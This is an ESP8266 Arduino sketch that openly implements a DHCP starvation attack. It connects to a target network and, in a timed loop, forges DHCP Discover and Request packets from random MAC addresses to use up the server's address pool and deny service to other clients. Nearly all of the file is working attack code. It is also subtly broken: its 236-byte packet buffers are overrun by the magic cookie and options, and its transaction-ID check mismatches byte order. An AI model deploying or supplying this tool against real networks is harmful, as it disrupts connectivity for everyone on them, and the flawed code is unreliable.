#include <ESP8266WiFi.h>
#include <WiFiUdp.h>

// Configuration
const char* TARGET_SSID = "YOUR_NETWORK";    // Target network SSID
const IPAddress DHCP_SERVER(192, 168, 1, 1);  // DHCP server IP
const unsigned int ATTACK_DELAY = 300;        // Delay between attacks (ms)

WiFiUDP udp;
unsigned long lastAttackTime = 0;
uint32_t currentXID = 0;
uint8_t currentMAC[6];
IPAddress offeredIP;

void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("\n[+] ESP8266 DHCP Exhaustion Attack");
  
  // Initialize WiFi
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  // Connect to network (required for reliable packet injection)
  Serial.printf("[+] Connecting to %s\n", TARGET_SSID);
  WiFi.begin(TARGET_SSID);
  
  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 10) {
    delay(500);
    Serial.print(".");
    attempts++;
  }
  
  if (WiFi.status() != WL_CONNECTED) {
    Serial.println("\n[-] Failed to connect - continuing in promiscuous mode");
  } else {
    Serial.println("\n[+] Connected to network");
    Serial.print("[+] IP Address: ");
    Serial.println(WiFi.localIP());
  }
  
  // Initialize UDP
  udp.begin(68);  // DHCP client port
  randomSeed(ESP.getCycleCount());
}

void loop() {
  // Main attack loop with timing control
  if (millis() - lastAttackTime > ATTACK_DELAY) {
    lastAttackTime = millis();
    
    // Generate new random MAC and XID
    generateRandomMAC(currentMAC);
    currentXID = random(0xFFFFFFFF);
    
    // Send DHCP Discover
    if (sendDHCPDiscover(currentMAC, currentXID)) {
      Serial.printf("[+] Sent Discover - XID: 0x%08X, MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                   currentXID, currentMAC[0], currentMAC[1], currentMAC[2],
                   currentMAC[3], currentMAC[4], currentMAC[5]);
    } else {
      Serial.println("[-] Failed to send Discover");
    }
    
    // Listen for Offer (with timeout)
    unsigned long offerTimeout = millis() + 500;
    while (millis() < offerTimeout) {
      if (listenForDHCPOffer()) {
        // Send Request if we got an Offer
        if (sendDHCPRequest(currentMAC, currentXID, offeredIP)) {
          Serial.printf("[+] Sent Request for %s\n", offeredIP.toString().c_str());
        }
        break;
      }
      delay(10);
    }
  }
}

void generateRandomMAC(uint8_t* mac) {
  mac[0] = 0x02;  // Locally administered MAC
  for (int i = 1; i < 6; i++) {
    mac[i] = random(256);
  }
}

bool sendDHCPDiscover(uint8_t* mac, uint32_t xid) {
  uint8_t buffer[236];
  int pos = 0;
  
  // BOOTP Header
  buffer[pos++] = 0x01;   // BOOTREQUEST
  buffer[pos++] = 0x01;   // Ethernet
  buffer[pos++] = 0x06;   // HW addr len
  buffer[pos++] = 0x00;   // Hops
  
  // Transaction ID
  buffer[pos++] = (xid >> 24) & 0xFF;
  buffer[pos++] = (xid >> 16) & 0xFF;
  buffer[pos++] = (xid >> 8) & 0xFF;
  buffer[pos++] = xid & 0xFF;
  
  // Seconds elapsed and flags
  buffer[pos++] = 0x00; buffer[pos++] = 0x00; // Seconds
  buffer[pos++] = 0x80; buffer[pos++] = 0x00; // Flags
  
  // Zeroed IP addresses
  memset(buffer + pos, 0, 16);
  pos += 16;
  
  // Client MAC
  memcpy(buffer + pos, mac, 6);
  pos += 6;
  
  // Padding
  memset(buffer + pos, 0, 202);
  pos += 202;
  
  // DHCP Magic Cookie
  buffer[pos++] = 0x63;
  buffer[pos++] = 0x82;
  buffer[pos++] = 0x53;
  buffer[pos++] = 0x63;
  
  // DHCP Options
  buffer[pos++] = 53; buffer[pos++] = 1; buffer[pos++] = 1; // DHCP Discover
  buffer[pos++] = 55; buffer[pos++] = 4; // Parameter list
  buffer[pos++] = 1;  // Subnet mask
  buffer[pos++] = 3;  // Router
  buffer[pos++] = 6;  // DNS
  buffer[pos++] = 15; // Domain name
  buffer[pos++] = 255; // End
  
  // Send packet
  return udp.beginPacket(DHCP_SERVER, 67) && 
         (udp.write(buffer, pos) == pos) && 
         udp.endPacket();
}

bool listenForDHCPOffer() {
  int packetSize = udp.parsePacket();
  if (packetSize <= 0) return false;
  
  uint8_t buffer[512];
  int len = udp.read(buffer, sizeof(buffer));
  
  // Verify it's a DHCP Offer for our current XID
  if (len < 240 || buffer[0] != 0x02 || // BOOTREPLY
      memcmp(buffer + 4, &currentXID, 4) != 0) {
    return false;
  }
  
  // Parse DHCP options
  int optionsStart = 240;
  while (optionsStart < len - 3) {
    uint8_t option = buffer[optionsStart];
    if (option == 0) { // Padding
      optionsStart++;
      continue;
    }
    if (option == 255) break; // End
    
    uint8_t optLen = buffer[optionsStart + 1];
    
    if (option == 53 && optLen == 1) { // Message Type
      if (buffer[optionsStart + 2] == 2) { // DHCP Offer
        // Get offered IP (in fixed BOOTP position)
        offeredIP = IPAddress(buffer[16], buffer[17], buffer[18], buffer[19]);
        return true;
      }
    }
    optionsStart += 2 + optLen;
  }
  return false;
}

bool sendDHCPRequest(uint8_t* mac, uint32_t xid, IPAddress requestedIP) {
  uint8_t buffer[236];
  int pos = 0;
  
  // BOOTP Header (same as Discover)
  buffer[pos++] = 0x01;   // BOOTREQUEST
  buffer[pos++] = 0x01;   // Ethernet
  buffer[pos++] = 0x06;   // HW addr len
  buffer[pos++] = 0x00;   // Hops
  
  // Transaction ID
  buffer[pos++] = (xid >> 24) & 0xFF;
  buffer[pos++] = (xid >> 16) & 0xFF;
  buffer[pos++] = (xid >> 8) & 0xFF;
  buffer[pos++] = xid & 0xFF;
  
  // Seconds elapsed and flags
  buffer[pos++] = 0x00; buffer[pos++] = 0x00;
  buffer[pos++] = 0x80; buffer[pos++] = 0x00;
  
  // Zeroed IP addresses
  memset(buffer + pos, 0, 16);
  pos += 16;
  
  // Client MAC
  memcpy(buffer + pos, mac, 6);
  pos += 6;
  
  // Padding
  memset(buffer + pos, 0, 202);
  pos += 202;
  
  // DHCP Magic Cookie
  buffer[pos++] = 0x63;
  buffer[pos++] = 0x82;
  buffer[pos++] = 0x53;
  buffer[pos++] = 0x63;
  
  // DHCP Options
  buffer[pos++] = 53; buffer[pos++] = 1; buffer[pos++] = 3; // DHCP Request
  buffer[pos++] = 50; buffer[pos++] = 4; // Requested IP
  buffer[pos++] = requestedIP[0];
  buffer[pos++] = requestedIP[1];
  buffer[pos++] = requestedIP[2];
  buffer[pos++] = requestedIP[3];
  buffer[pos++] = 54; buffer[pos++] = 4; // Server ID
  buffer[pos++] = DHCP_SERVER[0];
  buffer[pos++] = DHCP_SERVER[1];
  buffer[pos++] = DHCP_SERVER[2];
  buffer[pos++] = DHCP_SERVER[3];
  buffer[pos++] = 255; // End
  
  // Send packet
  return udp.beginPacket(DHCP_SERVER, 67) && 
         (udp.write(buffer, pos) == pos) && 
         udp.endPacket();
}
